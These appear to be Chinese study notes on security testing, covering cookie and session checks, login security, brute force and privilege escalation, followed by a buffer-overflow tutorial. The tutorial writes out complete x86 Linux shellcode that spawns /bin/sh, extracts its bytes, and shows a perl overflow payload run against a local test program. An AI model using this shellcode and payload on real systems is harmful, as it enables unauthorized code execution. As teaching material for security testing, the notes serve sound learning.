# 安全测试
>* 考察软件系统功能特性中的安全保密性（防止信息被篡改；信息暴露；网站被攻击）

>## Cookie与Session测试
>* 定义：
>  * Cookie(s)：存在客户端的一组txt文件；
>  * Sessions：存在服务器端一组文件；
>* cookie操作
>   * 查看Cookie
>
>### cookie测试
>* Cookie是否起作用
>   * 按照需求或者和Cookie设计相关文档进行插入；Cookie的信息的记录与设计文档一致；
>* Cookie的保存期限
>   * 电商网站（商品）；抖音；新闻资讯
>* Cookie的设置生效
>   * 接受Cookie：全盘接受Cookie：使用网站系统功能表现如何
>   * 阻止Cookie：全盘阻止Cookie：使用网站系统功能表现如何
>   * 提示Cookie：部分接受Cookie：使用网站系统功能表现如何
>* Cookie的信息加密（身份证号；银行卡号；手机号----加密存储处理）
>* Cookie的安全性测试（Httponly；Secure）
>   * Httponly（True）：
>      *  禁止脚本文件访问到cookie信息，对cookie进行修改，防止跨站脚本攻击；
>   * Secure（True）：
>      *  加密传输；
>   * 无法通过人工手段查看，借助工具查看
>      * 开发者工具
>      * 抓包工具（fiddler）

>### 认证授权
>* 注册机制：（密码设定）；
>* 登录：密码隐文显示；在数据库的MD5加密算法；POST传输明文显示；密码次数的限制；登录超时直接断开登录连接；
>* 动态密码；验证码；

>### 暴力破解
>* 尝试1000次用户名和密码的组合；
>* 通过自动化工具去尝试；
>* 防御：
>  * 验证码：图片；动态；拼图---防止机械操作；

>### 越权漏洞
>* 复制URL地址访问，能访问到其他用户或权限的才能访问页面

>### 缓存溢出漏洞
>* [参考](https://blog.csdn.net/linyt/category_2868109.html)
>#### 缓存溢出原理分析
>#### 缓存溢出实践
>#### 初识shellcode
>#### 编写本地shellcode
>##### 如何避免零字节
>* shellcode通常是由于strcpy/sprintf等字符串函数造成溢出，因此通过来注入的shellcode不能出现零字节。但实际运行的代码是需要0的，那如何处理呢？
>* 使用xor指令对寄存器进行清零或者cld，如：
>
>* `xor eax, eax
>xor ebx, ebx
>xor ecx, ecx
>cld     ; `该指令对edx进行清零
>
>* 如果需要将eax的值赋为0x5，不能直接写成mov eax, 0x05，因为它会生成机器码mov eax, 0x00000005，会有0填充。可以采用下面这个技巧：
>
>* `xor eax, eax
>mov al, 0x05`
>
>* X86架上对通用寄存器都提供对应的16位和8寄存，上述例子就是通过它来避免零出现。

>##### 如何知道绝对地址
>* 尽管在前面的攻击例子中，shellcode存放的地址是已知道的，但不同的攻击中，它的地址是会变化的，那么我们如何编写shellcode不依赖了这个变化的地址而通用化呢？ 那么需要借用一些相对跳转指令来获取绝对地址
>
>* call指令是相对转跳，但会在栈上压上绝对地址，然后再弹出就可以获取绝对地址，如：
>
>* jmp short get_string
>* code:
>      pop eax            ; 这里弹出的是call指令压栈的下条指令的地址，即"hello world"字符串的地址
>
>* get_string:
>      call code
>* data:
>* db 'hello world', 0x0a

>* push指令将数据压到栈上，然后获取esp的值，就是刚压栈数据的绝对地址，如：

``push 0x4b435546   ; 0x46, 0x55, 0x43, 0x4b 分别 FUCK字符的 ascii码
mov eax, esp            ; 将"FUCK"字符串首地址赋给eax，后续可用于系统调用传参``

>##### Linux系统调用约定
>* Linux系统调用是以int 0x80指令来陷入内核态的，系统调用号通过eax来传递，参数分别是ebx, ecx, edx, edi, esi来传递。

>##### 编写shellcode
>* 在Linux下编写shellcode，可以直接使用gcc对汇编.S文件进行编译链接，生成标准的可执行ELF文件，同时也能直接进行测试，但有一点不方便是的提取机器码很不方便。
>* 为了方便用提取机器码，使用nasm编译器生成bin格文件，没有任何其它格式数据，方便直接提取。
>* 我们要编写的本地shellcode，对应C 语言逻辑如下
>* `char *argv[2];`
>
>* `argv[0] = "/bin/sh";`
>* `argv[1] = NULL;`
>
>* `execve("/bin/sh", argv, NULL);`
>
>* 翻译成汇编语言过程如下：
>* 将"/bin/sh"字符串压到栈上，包含字符串结串符'\0'
>* `xor edx, edx`
>* `push edx`
>* `push 0x68732f2f`
>* `push 0x6e69622f`
>
>* 将字符串/bin//sh压入栈内，同时通过push edx来保证字符串后面的数所据是0，也即字符串结束符。 请注意，栈是从高地址向低地址生长的，所以要从字符串尾巴压起。
>* `mov ebx, esp`
>* 此时栈底就是字符中址的开始地址，该指令将字符串地址赋给ebx(系统调用的第一个参数）
>
>* 将下来是将argv[2]数组的内容放到栈上。
>* `push edx    ; 将argv[1](值为  NULL) 放到栈上`
>* `push ebx    ; 将argv[0]( "/bin//sh")放到栈上`
>  * 此时esp指向的空间，刚才对应argv[2]数组结构的开始地址
>  * 由于argv是系统调用第二参数，需要将它赋给ecx
>* `mov ecx, esp`
>* `xor eax, eax,`
>* `mov al, 0xb`
>  * 到这时, eax 为 11（系统调用号），ebx为"/bin//sh"字符号（第一参数），ecx为argv数组（第二参数），edx为NULL（第三参数），那就可以直接使用int 0x80进行系统调用了。
>
>* `int 0x80`
>
>* 将上述指令拼在一起就是如下的汇编代码：
>
> BITS 32
> 
> xor edx, edx
> push edx
> push 0x68732f2f
> push 0x6e69622f
>
> mov ebx, esp
>
> push edx
> push ebx
>
> mov ecx, esp
>
> xor eax, eax
> mov al, 0xb
>
> int 0x80


>##### 编译生成机器码
>     nasm -o shell2 shell2.s
>* 生成的shell2文件为bin数据，全是机器码，没有任何格式数据，使用Linux命令转换成bash或者perl可输入的shellcode.
>*     $ od -t x1 shell2 | sed -e 's/[0-7]*//' | sed -e 's/ /\\x/g'\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd
>* 然后使用之前的stack1程序进行测试：
$ echo $$
2503
$ perl -e 'printf "A"x48 . "\x10\xd7\xff\xff" . "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80"' > bad.txt;./stack1
data: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒▒▒1▒Rh//shh/bin▒▒RS▒▒1▒
                                                                              ̀▒▒▒
$ echo $$
4398
>
>* 说明：echo $$命令输出当前shell（即bash或者sh)的pid
>* 前后两次不一样，那就说明 shellcode执行后，打开了一个新shell。 也即shellcode运行成功，测试通过
>#### 编写shellcode测试工具
>#### 绕过地址混淆
>#### 绕过数据执行保护

>### DDOS攻击